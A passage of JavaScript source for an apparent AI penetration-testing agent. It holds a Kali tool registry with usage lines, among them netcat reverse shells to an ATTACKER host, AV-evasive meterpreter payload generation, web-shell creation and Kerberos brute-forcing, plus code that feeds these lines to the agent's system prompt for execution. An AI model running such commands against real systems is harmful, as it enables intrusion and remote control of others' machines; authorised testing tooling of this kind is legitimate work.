  { name: 'empire', bin: 'powershell-empire', cat: 'post-exploitation', desc: 'Post-exploitation C2 framework', install: 'sudo apt install -y powershell-empire', mitre: ['T1059'] },
  { name: 'weevely', bin: 'weevely', cat: 'post-exploitation', desc: 'Weaponized PHP web shell generator', install: 'sudo apt install -y weevely', mitre: ['T1505'],
    usage: [
      'weevely generate PASSWORD shell.php    # Generate backdoored PHP shell',
      'weevely URL PASSWORD                   # Connect to deployed shell',
    ]},
  { name: 'kerbrute', bin: 'kerbrute', cat: 'post-exploitation', desc: 'Kerberos brute-forcing and user enumeration', install: 'go install github.com/ropnop/kerbrute@latest', mitre: ['T1110', 'T1558'],
    usage: [
      'kerbrute userenum --dc DC_IP -d DOMAIN users.txt  # User enumeration',
      'kerbrute bruteuser --dc DC_IP -d DOMAIN pass.txt USER  # Password brute',
    ]},

  // ═══ TUNNELING & PIVOTING ═══
  { name: 'chisel', bin: 'chisel', cat: 'tunneling', desc: 'Fast TCP/UDP tunnel over HTTP', install: 'go install github.com/jpillora/chisel@latest', mitre: ['T1572'],
    usage: [
      'chisel server -p 8080 --reverse        # Start server (attacker)',
      'chisel client ATTACKER:8080 R:9999:127.0.0.1:80  # Reverse port forward (victim)',
    ]},
  { name: 'ligolo-ng', bin: 'ligolo-proxy', cat: 'tunneling', desc: 'Advanced tunneling using TUN interface', install: 'go install github.com/nicocha30/ligolo-ng@latest', mitre: ['T1572'] },
  { name: 'sshuttle', bin: 'sshuttle', cat: 'tunneling', desc: 'Transparent proxy server over SSH', install: 'sudo apt install -y sshuttle', mitre: ['T1572'],
    usage: ['sshuttle -r user@TARGET 10.0.0.0/24    # Tunnel entire subnet over SSH'] },
  { name: 'proxychains', bin: 'proxychains4', cat: 'tunneling', desc: 'TCP connection proxy chaining', install: 'sudo apt install -y proxychains4', mitre: ['T1090'],
    usage: ['proxychains4 nmap -sT TARGET           # Run nmap through proxy chain'] },
  { name: 'socat', bin: 'socat', cat: 'tunneling', desc: 'Multipurpose relay for bidirectional data transfer', install: 'sudo apt install -y socat', mitre: ['T1572'],
    usage: [
      'socat TCP-LISTEN:4444,fork TCP:TARGET:80   # Port forwarding',
      'socat file:`tty`,raw,echo=0 tcp-listen:4444  # Catch reverse shell with full TTY',
    ]},
  { name: 'netcat', bin: 'nc', cat: 'tunneling', desc: 'TCP/UDP Swiss army knife', install: 'sudo apt install -y netcat-openbsd', mitre: ['T1095'],
    usage: [
      'nc -lvnp 4444                          # Listen for reverse shell',
      'nc -e /bin/bash ATTACKER 4444          # Send reverse shell',
      'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER 4444 >/tmp/f  # Reverse shell (no -e)',
    ]},

  // ═══ REVERSE ENGINEERING ═══
  { name: 'ghidra', bin: 'ghidra', cat: 'reverse-engineering', desc: 'NSA reverse engineering framework', install: 'sudo apt install -y ghidra', mitre: ['T1587'] },
  { name: 'radare2', bin: 'r2', cat: 'reverse-engineering', desc: 'Reverse engineering framework with CLI', install: 'sudo apt install -y radare2', mitre: ['T1587'] },
  { name: 'gdb', bin: 'gdb', cat: 'reverse-engineering', desc: 'GNU debugger', install: 'sudo apt install -y gdb', mitre: ['T1587'] },
  { name: 'binwalk', bin: 'binwalk', cat: 'reverse-engineering', desc: 'Firmware analysis and extraction', install: 'sudo apt install -y binwalk', mitre: ['T1587'],
    usage: ['binwalk -e firmware.bin                # Extract embedded files'] },
  { name: 'pwntools', bin: 'pwn', cat: 'reverse-engineering', desc: 'CTF framework and exploit development', install: 'pip3 install pwntools', mitre: ['T1587'] },

  // ═══ FORENSICS ═══
  { name: 'volatility3', bin: 'vol', cat: 'forensics', desc: 'Advanced memory forensics framework', install: 'pip3 install volatility3', mitre: ['T1005'] },
  { name: 'exiftool', bin: 'exiftool', cat: 'forensics', desc: 'Metadata reader/writer for files', install: 'sudo apt install -y libimage-exiftool-perl', mitre: ['T1005'],
    usage: ['exiftool FILE                          # Read all metadata'] },
  { name: 'steghide', bin: 'steghide', cat: 'forensics', desc: 'Steganography tool', install: 'sudo apt install -y steghide', mitre: ['T1027'],
    usage: ['steghide extract -sf image.jpg         # Extract hidden data'] },

  // ═══ SOCIAL ENGINEERING ═══
  { name: 'setoolkit', bin: 'setoolkit', cat: 'social-engineering', desc: 'Social-Engineer Toolkit — phishing, credential harvest', install: 'sudo apt install -y set', mitre: ['T1566', 'T1598'],
    usage: ['setoolkit                               # Launch interactive menu'] },
  { name: 'gophish', bin: 'gophish', cat: 'social-engineering', desc: 'Open-source phishing framework', install: 'git clone https://github.com/gophish/gophish.git', mitre: ['T1566'] },

  // ═══ EVASION ═══
  { name: 'veil', bin: 'veil', cat: 'evasion', desc: 'Payload generation framework for AV evasion', install: 'sudo apt install -y veil', mitre: ['T1027'],
    usage: ['veil -t Evasion -p python/meterpreter/rev_tcp --ip ATTACKER --port 4444 -o payload  # AV-evasive payload'] },
  { name: 'shellter', bin: 'shellter', cat: 'evasion', desc: 'Dynamic PE injector for AV evasion', install: 'sudo apt install -y shellter', mitre: ['T1027'] },
  { name: 'tor', bin: 'tor', cat: 'evasion', desc: 'Anonymity network', install: 'sudo apt install -y tor', mitre: ['T1090'] },

  // ═══ GENERAL UTILITIES ═══
  { name: 'curl', bin: 'curl', cat: 'utilities', desc: 'Command-line HTTP client', install: 'sudo apt install -y curl', mitre: [],
    usage: [
      'curl -sI URL                           # Fetch headers only',
      'curl -s URL                            # Fetch page content',
      'curl -X POST -d "data" URL             # POST request',
    ]},
  { name: 'wget', bin: 'wget', cat: 'utilities', desc: 'Non-interactive downloader', install: 'sudo apt install -y wget', mitre: [] },
  { name: 'python3', bin: 'python3', cat: 'utilities', desc: 'Python 3 interpreter', install: 'sudo apt install -y python3', mitre: [] },
  { name: 'go', bin: 'go', cat: 'utilities', desc: 'Go programming language', install: 'sudo apt install -y golang-go', mitre: [] },
  { name: 'jq', bin: 'jq', cat: 'utilities', desc: 'Command-line JSON processor', install: 'sudo apt install -y jq', mitre: [] },
  { name: 'whois', bin: 'whois', cat: 'utilities', desc: 'WHOIS domain/IP lookup', install: 'sudo apt install -y whois', mitre: ['T1596'],
    usage: ['whois DOMAIN_OR_IP                     # WHOIS lookup'] },
  { name: 'docker', bin: 'docker', cat: 'utilities', desc: 'Container runtime', install: 'sudo apt install -y docker.io', mitre: [] },
  { name: 'geoiplookup', bin: 'geoiplookup', cat: 'utilities', desc: 'IP geolocation from MaxMind DB', install: 'sudo apt install -y geoip-bin', mitre: [],
    usage: ['geoiplookup IP                         # Get country/city for IP'] },

  // ═══ PROJECTDISCOVERY SUITE ═══
  { name: 'naabu', bin: 'naabu', cat: 'information-gathering', desc: 'Fast port scanner with SYN/CONNECT scan', install: 'go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest', mitre: ['T1595'],
    usage: [
      'naabu -host TARGET -p - -silent        # Full port scan',
      'naabu -host TARGET -top-ports 100      # Top 100 ports',
    ]},
  { name: 'dnsx', bin: 'dnsx', cat: 'information-gathering', desc: 'Fast DNS toolkit', install: 'go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest', mitre: ['T1590'],
    usage: ['echo DOMAIN | dnsx -a -resp -json      # Resolve A records with JSON'] },
  { name: 'uncover', bin: 'uncover', cat: 'information-gathering', desc: 'Search engine aggregator — Shodan, Censys, FOFA', install: 'go install github.com/projectdiscovery/uncover/cmd/uncover@latest', mitre: ['T1596'],
    usage: ['uncover -q "apache" -e shodan,censys    # Search Shodan + Censys'] },
  { name: 'interactsh', bin: 'interactsh-client', cat: 'web-application', desc: 'OOB interaction gathering for SSRF/XXE/RCE', install: 'go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest', mitre: ['T1190'],
    usage: ['interactsh-client                       # Start OOB listener, get unique URL'] },
];

// ═══════════════════════════════════════════════════════════
// Cached detection result
// ═══════════════════════════════════════════════════════════
let cachedInstalledTools = null;
let cacheTimestamp = 0;
const CACHE_TTL = 300000; // 5 minutes

/**
 * Detect all installed tools in one batch shell command
 * @returns {Map<string, Object>} Map of tool name → tool metadata
 */
export function detectInstalledTools() {
  const now = Date.now();
  if (cachedInstalledTools && (now - cacheTimestamp) < CACHE_TTL) {
    return cachedInstalledTools;
  }

  const allBinaries = [...new Set(KALI_TOOLS.map(t => t.bin))];

  // Single batch shell command — checks ALL binaries at once
  const checkScript = allBinaries.map(bin => `command -v ${bin} >/dev/null 2>&1 && echo ${bin}`).join('; ');

  let foundSet = new Set();
  try {
    const found = execSync(`/bin/sh -c '${checkScript}'`, {
      timeout: 10000, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore']
    }).trim();
    foundSet = new Set(found.split('\n').filter(Boolean));
  } catch { /* empty */ }

  const result = new Map();
  for (const tool of KALI_TOOLS) {
    if (foundSet.has(tool.bin)) {
      result.set(tool.name, { ...tool, installed: true });
    }
  }

  cachedInstalledTools = result;
  cacheTimestamp = now;
  return result;
}

/**
 * Get all tools in the registry (installed or not)
 */
export function getAllTools() {
  return KALI_TOOLS;
}

/**
 * Get tools by category
 */
export function getToolsByCategory(category) {
  return KALI_TOOLS.filter(t => t.cat === category);
}

/**
 * Get tools mapped to a specific MITRE ATT&CK technique
 */
export function getToolsForTechnique(techniqueId) {
  return KALI_TOOLS.filter(t => t.mitre.includes(techniqueId));
}

/**
 * Search tools by name or description
 */
export function searchTools(query) {
  const q = query.toLowerCase();
  return KALI_TOOLS.filter(t =>
    t.name.toLowerCase().includes(q) ||
    t.desc.toLowerCase().includes(q) ||
    t.cat.toLowerCase().includes(q)
  );
}

/**
 * Get tool metadata including install command
 */
export function getToolInfo(toolName) {
  return KALI_TOOLS.find(t => t.name === toolName || t.bin === toolName) || null;
}

/**
 * Get all unique categories
 */
export function getCategories() {
  return [...new Set(KALI_TOOLS.map(t => t.cat))];
}

/**
 * Build a comprehensive tools context string for the system prompt
 * NOW includes usage examples so the AI can construct commands dynamically
 */
export function buildToolsContext() {
  const installed = detectInstalledTools();
  const categories = getCategories();

  let ctx = '\n\n## INSTALLED TOOLS & USAGE\n\n';
  ctx += `**${installed.size} tools detected** on this system. Use \`execute_command\` to run ANY of these.\n`;
  ctx += 'Use `install_tool` to install any missing tool.\n\n';

  for (const cat of categories) {
    const catTools = KALI_TOOLS.filter(t => t.cat === cat);
    const installedInCat = catTools.filter(t => installed.has(t.name));

    if (installedInCat.length > 0) {
      ctx += `### ${cat.toUpperCase().replace(/-/g, ' ')} (${installedInCat.length})\n\n`;
      for (const tool of installedInCat) {
        ctx += `**${tool.name}** — ${tool.desc}\n`;
        if (tool.usage && tool.usage.length > 0) {
          // Show top 3 usage examples to keep context manageable
          for (const u of tool.usage.slice(0, 3)) {
            ctx += `  \`${u}\`\n`;
          }
        }
        ctx += '\n';
      }
    }
  }

  // List installable tools (not installed but in registry)
  const notInstalled = KALI_TOOLS.filter(t => !installed.has(t.name));
  if (notInstalled.length > 0) {
    ctx += `\n**Installable** (${notInstalled.length} more): ${notInstalled.map(t => t.name).join(', ')}\n`;
  }

  return ctx;
}

/**
 * Invalidate cached detection (call after installing new tools)
 */
export function invalidateCache() {
  cachedInstalledTools = null;
  cacheTimestamp = 0;
}
